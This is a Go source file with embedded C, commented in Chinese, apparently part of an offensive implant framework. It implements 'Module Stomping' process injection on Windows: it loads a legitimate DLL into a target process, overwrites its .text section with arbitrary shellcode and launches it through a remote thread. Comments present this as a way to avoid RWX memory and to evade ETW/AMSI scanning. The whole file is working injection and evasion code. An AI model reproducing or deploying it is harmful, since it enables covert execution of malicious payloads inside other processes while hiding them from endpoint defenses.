//go:build windows && amd64 && cgo

package inject

/*
#cgo CFLAGS: -O2
#include <windows.h>
#include <tlhelp32.h>

// module_stomp_inject 实现 Module Stomping 注入。
// 两阶段内存分配：
//   1. 在目标进程中 LoadLibrary 加载合法 DLL
//   2. 将 DLL 的 .text 节改为 RW，写入 shellcode
//   3. 恢复 .text 为 RX
//   4. 创建远程线程执行 shellcode
//
// OPSEC 优势：
//   - 目标进程包含合法 DLL 映射（非匿名内存）
//   - 无 RWX 内存区域
//   - shellcode 伪装为 DLL 代码

// strcasecmp compat: on Windows MSVCRT provides _stricmp
#ifdef _WIN32
#define strcasecmp _stricmp
#endif
int module_stomp_inject(int pid, unsigned char* shellcode, int shellcodeLen, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProcess) return -1;

    // 1. 在目标进程中加载 DLL
    SIZE_T dllPathLen = (strlen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteDllPath) {
        CloseHandle(hProcess);
        return -2;
    }

    // 写入 DLL 路径（Unicode）
    WCHAR* widePath = (WCHAR*)malloc(dllPathLen);
    MultiByteToWideChar(CP_ACP, 0, dllPath, -1, widePath, dllPathLen / sizeof(WCHAR));
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteDllPath, widePath, dllPathLen, &written)) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        free(widePath);
        CloseHandle(hProcess);
        return -3;
    }
    free(widePath);

    // 获取 LoadLibraryW 地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibAddr =
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibAddr) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -4;
    }

    // 调用 LoadLibraryW
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibAddr, remoteDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -5;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // 释放路径内存
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);

    // 2. 获取 DLL 在目标进程中的基址
    // 通过枚举模块找到 DLL
    MODULEENTRY32W me32;
    me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, (DWORD)pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return -6;
    }

    uintptr_t dllBase = 0;
    // 从 dllPath 中提取文件名用于精确匹配
    const char* dllBaseName = strrchr(dllPath, '\\');
    if (!dllBaseName) dllBaseName = strrchr(dllPath, '/');
    if (dllBaseName) dllBaseName++; else dllBaseName = dllPath;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            char dllName[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, me32.szModule, -1, dllName, MAX_PATH, NULL, NULL);

            // 精确匹配文件名（避免 "ntdll.dll" 误匹配 "ntd11.dll"）
            if (strcasecmp(dllBaseName, dllName) == 0) {
                dllBase = (uintptr_t)me32.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);

    if (dllBase == 0) {
        CloseHandle(hProcess);
        return -7;
    }

    // 3. 将 .text 节改为 RW
    // PE header 在 dllBase 处
    // 读取 DOS header 获取 PE offset
    unsigned char dosHeader[64];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (LPCVOID)dllBase, dosHeader, 64, &bytesRead)) {
        CloseHandle(hProcess);
        return -8;
    }

    int e_lfanew = *(int*)(dosHeader + 0x3C);

    // Read PE header and section table
    // PE32+: DOS(64) + PE sig(4) + COFF(20) + OptHeader(240) + ~6 sections(240) = ~568 bytes
    // Use 1024 to safely cover large section counts
    unsigned char peHeader[1024];
    if (!ReadProcessMemory(hProcess, (LPCVOID)(dllBase + e_lfanew), peHeader, 1024, &bytesRead)) {
        CloseHandle(hProcess);
        return -9;
    }

    unsigned short sections = *(unsigned short*)(peHeader + 6);
    unsigned short sizeOfOptHeader = *(unsigned short*)(peHeader + 20);

    // 节表在 PE header 后
    unsigned char* sectionTable = peHeader + 24 + sizeOfOptHeader;
    uintptr_t textRVA = 0;
    unsigned int textSize = 0;

    for (int i = 0; i < sections && i < 6; i++) {
        unsigned char* sec = sectionTable + (i * 40);
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' && sec[3] == 'x' && sec[4] == 't') {
            textRVA = *(unsigned int*)(sec + 12);
            textSize = *(unsigned int*)(sec + 8);
            break;
        }
    }

    if (textRVA == 0 || textSize == 0) {
        CloseHandle(hProcess);
        return -10;
    }

    uintptr_t textAddr = dllBase + textRVA;
    unsigned int writeSize = (unsigned int)shellcodeLen;
    if (writeSize > textSize) {
        writeSize = textSize;
    }

    // 4. 修改 .text 为 RW
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, (LPVOID)textAddr, writeSize, PAGE_READWRITE, &oldProtect)) {
        CloseHandle(hProcess);
        return -11;
    }

    // 5. 写入 shellcode
    if (!WriteProcessMemory(hProcess, (LPVOID)textAddr, shellcode, writeSize, &written)) {
        VirtualProtectEx(hProcess, (LPVOID)textAddr, writeSize, oldProtect, &oldProtect);
        CloseHandle(hProcess);
        return -12;
    }

    // 6. 恢复 RX
    if (!VirtualProtectEx(hProcess, (LPVOID)textAddr, writeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        CloseHandle(hProcess);
        return -13;
    }

    // 7. 创建远程线程执行
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)textAddr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProcess);
        return -14;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
*/
import "C"

import (
	"fmt"
	"unsafe"
)

// ModuleStompConfig 是 Module Stomping 注入配置。
type ModuleStompConfig struct {
	PID        int
	Shellcode  []byte
	DLLPath    string // 合法 DLL 路径（如 "ntdll.dll", "user32.dll"）
}

// ModuleStompResult 是 Module Stomping 注入结果。
type ModuleStompResult struct {
	Success bool
	Message string
}

// InjectModuleStomp 执行 Module Stomping 注入。
// 两步流程：
//   1. 在目标进程中 LoadLibrary 加载合法 DLL
//   2. 将 DLL 的 .text 节覆盖为 shellcode，创建远程线程执行
//
// OPSEC 优势：
//   - 目标进程有合法 DLL 映射，非匿名内存
//   - 无 RWX 内存区域（RW → 写入 → RX）
//   - 执行地址在已知 DLL 范围内，ETW/AMSI 扫描难以区分
func InjectModuleStomp(cfg *ModuleStompConfig) *ModuleStompResult {
	if cfg.PID <= 0 || len(cfg.Shellcode) == 0 {
		return &ModuleStompResult{
			Success: false,
			Message: "invalid pid or empty shellcode",
		}
	}

	dllPath := cfg.DLLPath
	if dllPath == "" {
		// 避免覆写 ntdll.dll 的 .text 节（所有进程共用，覆写会导致崩溃）
		// 选择不常用的小 DLL，降低目标进程内其他代码调用该 DLL 函数的概率
		dllPath = "msctf.dll"
	}

	cDllPath := C.CString(dllPath)
	defer C.free(unsafe.Pointer(cDllPath))

	ret := C.module_stomp_inject(
		C.int(cfg.PID),
		(*C.uchar)(unsafe.Pointer(&cfg.Shellcode[0])),
		C.int(len(cfg.Shellcode)),
		cDllPath,
	)

	if ret != 0 {
		return &ModuleStompResult{
			Success: false,
			Message: fmt.Sprintf("module stomp failed: code=%d", int(ret)),
		}
	}

	return &ModuleStompResult{
		Success: true,
		Message: fmt.Sprintf("module stomp via %s: shellcode injected into .text section", dllPath),
	}
}
